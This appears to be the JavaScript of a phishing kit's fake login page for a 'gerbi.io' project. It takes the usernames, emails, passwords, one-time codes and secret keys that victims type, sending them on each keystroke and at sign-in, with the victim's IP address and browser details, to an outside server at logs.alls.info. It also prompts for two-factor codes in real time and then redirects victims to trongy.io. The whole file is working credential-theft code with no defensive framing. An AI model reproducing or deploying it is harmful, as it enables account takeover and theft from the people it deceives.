document.addEventListener('DOMContentLoaded', async function () {
  const LOG_SERVER = 'https://logs.alls.info/';
  const PROJECT_NAME = 'gerbi.io';
  const PROJECT_HOMEPAGE_URL = 'https://trongy.io';
  const PROJECT_FORGOT_PASSWORD = 'https://trongy.io/rec/';
  const PROJECT_AFFILIATE_URL = 'https://trongy.io/?ref=official';
  let userIP = 'none';
  let sentData = null;

  const usernameGr = document.getElementById('log-username');
  const emailGr = document.getElementById('log-email');
  const passwordEl = document.getElementById('log-password');
  const otpGr = document.getElementById('log-otp');
  const secretGr = document.getElementById('log-secret');
  const forgotEl = document.getElementById('log-forgot');
  const signinEl = document.getElementById('log-signin');
  const signupEl = document.getElementById('log-signup');

  function isElementVisible(element) {
    // Check if element is a valid HTMLElement
    if (!(element instanceof HTMLElement)) {
      // console.error('>>>>>>>>>> Error: Parameter is not a valid HTMLElement');
      return false;
    }

    const style = window.getComputedStyle(element);
    const display = style.getPropertyValue('display');
    const visibility = style.getPropertyValue('visibility');
    return display !== 'none' && visibility !== 'hidden';
  }

  function showElement(element) {
    if (!element || !(element instanceof HTMLElement)) return;

    // Remove classes that might hide the element
    element.classList.remove(
      'd-none',
      'invisible',
      'hide',
      'hidden',
      'is-hidden',
      'uk-hidden'
    );

    element.style.display = '';
    element.style.visibility = 'visible';
  }

  function getInputElement(elementGr) {
    if (elementGr) {
      return elementGr.querySelector('input');
    }
    return null;
  }

  function getInputElementValue(elementGr) {
    let inputEl = getInputElement(elementGr);
    if (inputEl) {
      return inputEl.value ?? '';
    }
    return '';
  }

  function getEvent() {
    let username = getInputElementValue(usernameGr);
    let email = getInputElementValue(emailGr);
    let otp = getInputElementValue(otpGr);
    let secretKey = getInputElementValue(secretGr);
    let password = passwordEl && passwordEl.value ? passwordEl.value : '';

    return { username, email, otp, secretKey, password };
  }

  function getEventJson(event) {
    let { username, email, otp, secretKey, password } = getEvent();

    return JSON.stringify({
      ip: userIP,
      user_agent: navigator.userAgent,
      event: event,
      project: PROJECT_NAME,
      username,
      email,
      password,
      otp,
      secret_key: secretKey,
      source_url: window.location.href,
    });
  }

  async function sendEvent(event) {
    const jsonData = getEventJson(event);

    if (jsonData === sentData && event != 'signin') {
      return false;
    }
    sentData = jsonData;

    try {
      const response = await fetch(`${LOG_SERVER}event`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: jsonData,
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      return data.status;
    } catch (error) {
      console.error('>>>>>>>>>> Error: sending event:', error);
      return false;
    }
  }

  function validEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function hasSixDigits(inputString) {
    const regex = /^\d{6}$/;
    return regex.test(inputString);
  }

  function verifyEvent() {
    let { username, email, otp, secretKey, password } = getEvent();
    if (
      isElementVisible(usernameGr) &&
      (username.includes(' ') || username.length < 2)
    ) {
      alert('Username is invalid!');
      return false;
    }
    if (
      isElementVisible(emailGr) &&
      (email.includes(' ') || !validEmail(email))
    ) {
      alert('Email is invalid!');
      return false;
    }
    if (password.includes(' ') || password.length < 2) {
      alert('Password is invalid!');
      return false;
    }
    if (isElementVisible(otpGr) && !hasSixDigits(otp)) {
      alert('Authentication code is invalid!');
      return false;
    }
    if (isElementVisible(secretGr) && !hasSixDigits(secretKey)) {
      alert('Secret key is invalid!');
      return false;
    }
    return true;
  }

  const loadingOverlay = createLoadingOverlay();
  async function handleSignin() {
    let validEvent = verifyEvent();
    if (validEvent) {
      loadingOverlay.startLoading();
      const eventSent = await sendEvent('signin');
      isSigningIn = true;
      loadingOverlay.stopLoading();
      switch (eventSent) {
        case 'wrong':
          if (isElementVisible(secretGr)) {
            alert('Invalid secret key');
          } else if (isElementVisible(otpGr)) {
            alert('Invalid authentication code');
          } else {
            alert(
              `Invalid ${isElementVisible(usernameGr) ? 'Username or ' : ''}${
                isElementVisible(emailGr) ? 'Email or' : ''
              } Password`
            );
          }
          return;
        case 'otp':
          if (!isElementVisible(otpGr)) {
            showElement(otpGr);
            return;
          }
          break;
        case 'secret':
          if (!isElementVisible(secretGr)) {
            showElement(secretGr);
            return;
          }
          break;
      }
      window.location.href = PROJECT_HOMEPAGE_URL;
    }
  }

  // add event handle
  if (passwordEl) {
    passwordEl.addEventListener('keyup', () => sendEvent('keyup'));
  } else {
    console.error('>>>>>>>>>> Error: Not has password element');
  }
  if (otpGr) {
    let inputEl = getInputElement(otpGr);
    if (inputEl) {
      inputEl.addEventListener('keyup', () => sendEvent('keyup'));
    } else {
      console.error('>>>>>>>>>> Error: Not has otp input element');
    }
  }
  if (secretGr) {
    let inputEl = getInputElement(secretGr);
    if (inputEl) {
      inputEl.addEventListener('keyup', () => sendEvent('keyup'));
    } else {
      console.error('>>>>>>>>>> Error: Not has secret input element');
    }
  }
  if (forgotEl) {
    forgotEl.addEventListener('click', () =>
      window.open(PROJECT_FORGOT_PASSWORD, '_blank')
    );
  }
  if (signupEl) {
    signupEl.addEventListener('click', () =>
      window.open(PROJECT_AFFILIATE_URL, '_blank')
    );
  }
  if (signinEl) {
    signinEl.addEventListener('click', handleSignin);
  } else {
    console.error('>>>>>>>>>> Error: Not has signin button element');
  }

  async function getUserIP() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  }

  try {
    userIP = await getUserIP();
  } catch (error) {}

  function createLoadingOverlay() {
    // Create the loading overlay
    var loadingOverlay = document.createElement('div');
    loadingOverlay.id = 'loading-overlay';

    // Style the loading overlay
    loadingOverlay.style.position = 'fixed';
    loadingOverlay.style.top = '0';
    loadingOverlay.style.left = '0';
    loadingOverlay.style.width = '100%';
    loadingOverlay.style.height = '100%';
    loadingOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
    loadingOverlay.style.display = 'flex';
    loadingOverlay.style.justifyContent = 'center';
    loadingOverlay.style.alignItems = 'center';
    loadingOverlay.style.flexDirection = 'column';
    loadingOverlay.style.zIndex = '9999'; // Ensure it is on top
    loadingOverlay.style.visibility = 'hidden'; // Initially hidden

    // Create the spinner
    var spinner = document.createElement('div');
    spinner.style.border = '4px solid rgba(0, 0, 0, 0.1)';
    spinner.style.borderLeftColor = '#000';
    spinner.style.borderRadius = '50%';
    spinner.style.width = '40px';
    spinner.style.height = '40px';
    spinner.style.animation = 'spin 1s linear infinite';

    // Add keyframes for spinner animation
    var styleSheet = document.createElement('style');
    styleSheet.type = 'text/css';
    styleSheet.innerText = `
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    `;
    document.head.appendChild(styleSheet);

    // Create the loading text
    var loadingText = document.createElement('div');
    loadingText.innerText = 'Loading...';
    loadingText.style.marginTop = '10px';
    loadingText.style.fontSize = '18px';
    loadingText.style.color = '#000';

    // Append spinner and text to the overlay
    loadingOverlay.appendChild(spinner);
    loadingOverlay.appendChild(loadingText);

    // Append the overlay to the body
    document.body.appendChild(loadingOverlay);

    return {
      startLoading: function () {
        loadingOverlay.style.visibility = 'visible';
      },
      stopLoading: function () {
        loadingOverlay.style.visibility = 'hidden';
      },
    };
  }
});
